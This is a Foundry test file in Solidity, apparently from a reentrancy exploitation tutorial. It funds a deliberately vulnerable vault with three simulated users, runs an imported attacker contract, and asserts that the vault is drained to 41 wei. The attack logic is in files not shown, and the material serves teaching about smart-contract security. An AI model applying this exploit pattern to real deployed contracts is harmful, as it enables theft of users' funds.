// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/04_2-subtraction.sol";
import "../src/04_2-template_attacker.sol";

contract ProofOfConcept is Test {

    Vulnerable_ERC4626 public victim;
    Attacker public attacker;
    uint256 public constant USR_PARTICIPATION = 10 ether;

    // The setUp() function will be run before each test to set the initial scenario
    function setUp() public {
        // Declaring our contracts
        victim = new Vulnerable_ERC4626();
        attacker = new Attacker(address(victim));
        address alice = address(0x0);
        address bob = address(0x1);
        address charles = address(0x2);

        // Labelling for test traces
        vm.label(address(victim), "victim_contract");         
        vm.label(address(attacker), "attacker_contract");
        vm.label(alice, "alice");
        vm.label(bob, "bob");
        vm.label(charles, "charles");

        // Funding both parties
        vm.deal(address(attacker), 1 ether); // It is not necessary to fund the attacker as you could just send eth along, but still
        vm.deal(alice, USR_PARTICIPATION);
        vm.deal(bob, USR_PARTICIPATION);
        vm.deal(charles, USR_PARTICIPATION);   

        // Simulare legitimate users's usage
        vm.prank(alice);
        victim.deposit{value: USR_PARTICIPATION}();
        vm.prank(alice);
        uint shares = victim.stake(USR_PARTICIPATION);
        console.log("[>] Alice got %s shares", toEth(shares));
        vm.prank(bob);
        victim.deposit{value: USR_PARTICIPATION}();
        vm.prank(bob);
        shares = victim.stake(USR_PARTICIPATION);
        console.log("[>] Bob got %s shares", toEth(shares));
        vm.prank(charles);
        victim.deposit{value: USR_PARTICIPATION}();
        vm.prank(charles);
        shares = victim.stake(USR_PARTICIPATION);  
        console.log("[>] Charles got %s shares", toEth(shares));

        // Simulate rewards accrued by the protocol "somehow" (staking rew, donations, etc)
        console.log("[>] Random donation of 10 eth");
        (bool success, ) = address(victim).call{value: USR_PARTICIPATION}(""); 
        require(success, "Transfer failed.");

        // Init scenario
        uint price = victim.getValueOfShares(1 ether); // Considering that shares has the same decs as ETH
        console.log("[>] Share price: %s eth", toEth(price));                 
    }

    // Foundry tests should start with the word "test" to be recognized as such
    function test_exploit() public {
        console.log(unicode"\n   📚📚 All things reentrancy: (not so) basic exploitation\n");
        console.log("--------------------------------------------------------");
        console.log(unicode"| => Victim's balance 🙂 %s 🙂", toEth(address(victim).balance));
        console.log(unicode"| => Attacker balance 👀 %s 👀", toEth(address(attacker).balance));  
        console.log("--------------------------------------------------------"); 

        console.log(unicode"\n\t💥💥💥💥 EXPLOITING... 💥💥💥💥\n"); 

        attacker.exploit();
        vm.roll(11);
        attacker.getTheMoney();

        // Conditions to fullfill - leaving just 1 wei sitting in the contract after finishing the reentrancy step
        assertEq(address(attacker).balance, 40999999999999999959);
        assertEq(address(victim).balance, 41); // You can drain the contract even more if you deposit more than 1 eth :)

        console.log("--------------------------------------------------------"); 
        console.log(unicode"| => Victim's balance ☠  %s ☠", toEth(address(victim).balance));
        console.log(unicode"| => Attacker balance 💯 %s 💯", toEth(address(attacker).balance));        
        console.log("--------------------------------------------------------");               
    }


    function toEth(uint256 _wei) internal pure returns (string memory) {
        string memory eth = vm.toString(_wei / 1 ether);
        string memory decs = vm.toString(_wei % 1 ether);

        if ((bytes(decs).length < 17) && (_wei%1 ether != 0)) {
            uint256 n_zeros = 17 - bytes(decs).length;
            for (uint i = 0; i < n_zeros; i++) {
                decs = string.concat("0", decs);
            }
        }

        string memory result = string.concat(
            string.concat(eth, "."),
            decs
        );

        return result;
    }      
}
